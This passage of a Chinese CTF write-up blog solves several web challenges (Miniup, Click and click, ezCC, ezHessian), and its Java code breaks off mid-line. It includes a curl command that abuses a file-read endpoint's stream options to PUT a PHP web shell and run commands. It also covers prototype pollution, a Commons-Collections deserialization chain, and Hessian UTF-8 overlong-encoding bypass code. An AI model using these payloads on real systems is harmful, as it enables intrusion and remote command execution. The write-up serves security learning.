 <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> sio.connected:</span><br><span class="line">             <span class="keyword">await</span> sio.disconnect()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag_received:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[*] Script finished without finding the flag."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        SERVER_URL = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[*] Using server URL from argument: <span class="subst">{SERVER_URL}</span>"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        asyncio.run(main())</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n[*] Script interrupted by user."</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140925996.png" alt="image-20250508105402110"></p>
<h2 id="Miniup"><a href="#Miniup" class="headerlink" title="Miniup"></a>Miniup</h2><p>进去以后三个功能，上传图片、搜索图片以及查看图片</p>
<p>上传图片没啥名堂，校验死死的，搜索图片的话抓了请求包也没看到啥东西，果断看查看图片，这里直接发现任意文件读取:</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831645.png" alt="image.png"></p>
<p>直接猜测网页源代码路径为：/var/www/html/index.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$dufs_host</span> = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="variable">$dufs_port</span> = <span class="string">'5000'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'action'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'action'</span>] === <span class="string">'upload'</span>) {</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>])) {</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowed_extensions</span> = [<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>, <span class="string">'webp'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) {</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'只允许上传图片文件'</span>]);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_url</span> = <span class="string">'http://'</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span> . <span class="string">'/'</span> . <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">'tmp_name'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$target_url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="string">'PUT'</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$file_content</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, [</span><br><span class="line">                <span class="string">'Host: '</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span>,</span><br><span class="line">                <span class="string">'Origin: http://'</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span>,</span><br><span class="line">                <span class="string">'Referer: http://'</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span> . <span class="string">'/'</span>,</span><br><span class="line">                <span class="string">'Accept-Encoding: gzip, deflate'</span>,</span><br><span class="line">                <span class="string">'Accept: */*'</span>,</span><br><span class="line">                <span class="string">'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8'</span>,</span><br><span class="line">                <span class="string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span>,</span><br><span class="line">                <span class="string">'Content-Length: '</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$file_content</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$http_code</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_code</span> &gt;= <span class="number">200</span> &amp;&amp; <span class="variable">$http_code</span> &lt; <span class="number">300</span>) {</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">true</span>, <span class="string">'message'</span> =&gt; <span class="string">'图片上传成功'</span>]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'图片上传失败，请稍后再试'</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'未选择图片'</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'action'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'action'</span>] === <span class="string">'search'</span>) {</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'query'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'query'</span>])) {</span><br><span class="line">    <span class="variable">$search_query</span> = <span class="variable">$_POST</span>[<span class="string">'query'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$search_query</span>)) {</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'只允许输入数字和字母'</span>]);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="variable">$search_url</span> = <span class="string">'http://'</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span> . <span class="string">'/?q='</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$search_query</span>) . <span class="string">'&amp;json'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$search_url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, [</span><br><span class="line">                <span class="string">'Host: '</span> . <span class="variable">$dufs_host</span> . <span class="string">':'</span> . <span class="variable">$dufs_port</span>,</span><br><span class="line">                <span class="string">'Accept: */*'</span>,</span><br><span class="line">                <span class="string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span></span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$http_code</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_code</span> &gt;= <span class="number">200</span> &amp;&amp; <span class="variable">$http_code</span> &lt; <span class="number">300</span>) {</span><br><span class="line">            <span class="variable">$response_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$response</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$response_data</span>[<span class="string">'paths'</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$response_data</span>[<span class="string">'paths'</span>])) {</span><br><span class="line">                <span class="variable">$image_extensions</span> = [<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>, <span class="string">'webp'</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$filtered_paths</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$response_data</span>[<span class="string">'paths'</span>] <span class="keyword">as</span> <span class="variable">$item</span>) {</span><br><span class="line">                    <span class="variable">$file_name</span> = <span class="variable">$item</span>[<span class="string">'name'</span>];</span><br><span class="line">                    <span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$image_extensions</span>) || (<span class="variable">$item</span>[<span class="string">'path_type'</span>] === <span class="string">'Directory'</span>)) {</span><br><span class="line">                        <span class="variable">$filtered_paths</span>[] = <span class="variable">$item</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="variable">$response_data</span>[<span class="string">'paths'</span>] = <span class="variable">$filtered_paths</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">true</span>, <span class="string">'result'</span> =&gt; <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response_data</span>)]);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">true</span>, <span class="string">'result'</span> =&gt; <span class="variable">$response</span>]);</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'搜索失败，请稍后再试'</span>]);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'请输入搜索关键词'</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'action'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'action'</span>] === <span class="string">'view'</span>) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'filename'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) {</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>, <span class="literal">false</span>, <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$_POST</span>[<span class="string">'options'</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_content</span> !== <span class="literal">false</span>) {</span><br><span class="line">            <span class="variable">$base64_image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file_content</span>);</span><br><span class="line">            <span class="variable">$mime_type</span> = <span class="string">'image/jpeg'</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">'success'</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">                <span class="string">'is_image'</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">                <span class="string">'base64_data'</span> =&gt; <span class="string">'data:'</span> . <span class="variable">$mime_type</span> . <span class="string">';base64,'</span> . <span class="variable">$base64_image</span></span><br><span class="line">            ]);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'无法获取图片'</span>]);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">'success'</span> =&gt; <span class="literal">false</span>, <span class="string">'message'</span> =&gt; <span class="string">'请输入图片路径'</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>发现有一处可以我们控制的额外参数点，$_POST[‘options’]，为啥说是额外参数点，因为在抓包过程中数据包中没看到这个参数，也就是说这个参数要我们自己构造，那这个要我们自己构造的点往往就是破局的关键点。另外代码中一直有对127.0.0.1:5000这个端口的请求逻辑，那么我们就需要对这个端口进行请求，发现代码中有put逻辑上传文件的功能，那可以直接尝试PUT木马上去：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://127.0.0.1:55284/index.php \</span><br><span class="line">-d <span class="string">'action=view'</span> \</span><br><span class="line">--data-urlencode <span class="string">'filename=http://127.0.0.1:5000/shell.php'</span> \</span><br><span class="line">-d <span class="string">'options[http][method]=PUT'</span> \</span><br><span class="line">--data-urlencode <span class="string">'options[http][content]=&lt;?php system($_GET["cmd"]) ; ?&gt;'</span></span><br></pre></td></tr></tbody></table></figure>

<p>返回内容如下：</p>
<p>{“success”:true,”is_image”:true,”base64_data”:”data:image/jpeg;base64,”}</p>
<p>shell执行env命令，就可以拿到flag了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140937183.png" alt="image.png"></p>
<h2 id="Click-and-click"><a href="#Click-and-click" class="headerlink" title="Click and click"></a>Click and click</h2><p>页面和题目描述都说要按钮按到10000次，那就直接js安排：</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'button'</span>);</span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clickButton</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  button.<span class="title function_">click</span>();</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count % <span class="number">1000</span> === <span class="number">0</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Clicked <span class="subst">${count}</span> times`</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &gt;= <span class="number">10000</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Reached 10000 clicks! Stopping..."</span>);</span><br><span class="line">    <span class="keyword">return</span>; </span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">setTimeout</span>(clickButton, <span class="number">0</span>); </span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="title function_">clickButton</span>();</span><br></pre></td></tr></tbody></table></figure>

<p>给出两个提示:</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831582.png" alt="image.png">“前后端分离”估计就是提示页面有请求包，f12看了一下，每到50次就会发一个/update-amount的请求，其中请求的参数amount值为点击次数，当点击次数&lt;1000时，返回内容是ok，而当点击次数&gt;=1000,响应包状态码变400，内容为“你按的太快了！”。</p>
<p>“你按的太快了！”这里 感觉是后端有啥逻辑限制了，看到第2个提示，应该是nodejs代码，当amount为null或0就删除amount，再看到请求的数据是json格式，立马想到原型链污染，尝试污染这个amount，还真成功了，返回了flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140831589.png" alt="image.png"></p>
<h2 id="ezCC"><a href="#ezCC" class="headerlink" title="ezCC"></a>ezCC</h2><p>提示源码在secret目录下，下载进行审计。</p>
<p>pom.xml中有CC3.2.1，就是打CC链了，限制了发送的序列化后base64的数据长度要在6000以内，还不允许解码后出现以下词：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833011.png" alt="image-20250508112015730"></p>
<p>限制chainedTransformer，那立刻就想到用无数组的构造方式，难点在于把命令执行的类都限制死了，想到既然限制都是加在data参数上，那么是不是可以再通过另外一个参数传递要加载的字节码实现命令执行？ 看到题目用的springboot环境，那解决了。</p>
<p>自己构造payload太麻烦了，直接拿出javachains工具，使用下面这个利用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140951180.png" alt="image-20250508112615535"></p>
<p>Spring字节码加载可以设置自己要加载的另外一个字节码的参数名aaa:</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833099.png" alt="image.png"></p>
<p>长度为4064，刚刚好：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141001144.png" alt="image-20250508112803943"></p>
<p>然后另外一个参数aaa加载的字节码直接用one for all echo方式回显：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140833538.png" alt="image-20250508112909720"></p>
<p>发包时，post传参data为第一个构造的内容，aaa传参为第2个构造的内容，注意url编码传参内容，然后请求头X-Authorization设置要执行的命令，发包就可以执行命令了，直接执行env命令获得flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834087.png" alt="image-20250508113328347"></p>
<h2 id="ezHessian"><a href="#ezHessian" class="headerlink" title="ezHessian"></a>ezHessian</h2><p>看题目就知道考的是Hessian反序列化，也是刚接触，立马查资料学习了一下。</p>
<p>给的依赖只有hessian，版本为低版本4.0.38，可以通过原生jdk构造利用链实现Runtime执行命令，但是源码中限制构造的payload base64解码后不能出现“java”，这是个难点，后面给了提示UTF-8 Overlong Encoding才知道怎么绕的，重点学习了这篇文章：<a target="_blank" rel="noopener" href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p>
<p>盗用了一下其中的UTF-8 Overlong Encoding的代码：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2OutputWithOverlongEncoding</span> <span class="keyword">extends</span> <span class="title class_">Hessian2Output</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hessian2OutputWithOverlongEncoding</span><span class="params">(OutputStream os)</span> {</span><br><span class="line">        <span class="built_in">super</span>(os);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printString</span><span class="params">(String v, <span class="type">int</span> strOffset, <span class="type">int</span> length)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> (<span class="type">int</span>) getSuperFieldValue(<span class="string">"_offset"</span>);</span><br><span class="line">        <span class="type">byte</span>[] buffer = (<span class="type">byte</span>[]) getSuperFieldValue(<span class="string">"_buffer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) {</span><br><span class="line">            <span class="keyword">if</span> (SIZE &lt;= offset + <span class="number">16</span>) {</span><br><span class="line">                setSuperFieldValue(<span class="string">"_offset"</span>, offset);</span><br><span class="line">                flushBuffer();</span><br><span class="line">                offset = (<span class="type">int</span>) getSuperFieldValue(<span class="string">"_offset"</span>);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> v.charAt(i + strOffset);</span><br><span class="line">            buffer[offset++] = (<span class="type">byte</span>) (<span class="number">0xc0</span> + (convert(ch)[<span class="number">0</span>] &amp; <span class="number">0x1f</span>));</span><br><span class="line">            buffer[offset++] = (<span class="type">byte</span>) (<span class="number">0x80</span> + (convert(ch)[<span class="number">1</span>] &amp; <span class="number">0x3f</span>));</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        setSuperFieldValue(<span class="string">"_offset"</span>, offset);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printString</span><span class="params">(<span class="type">char</span>[] v, <span class="type">int</span> strOffset, <span class="type">int</span> length)</span> <span class="keyword">throws</span> 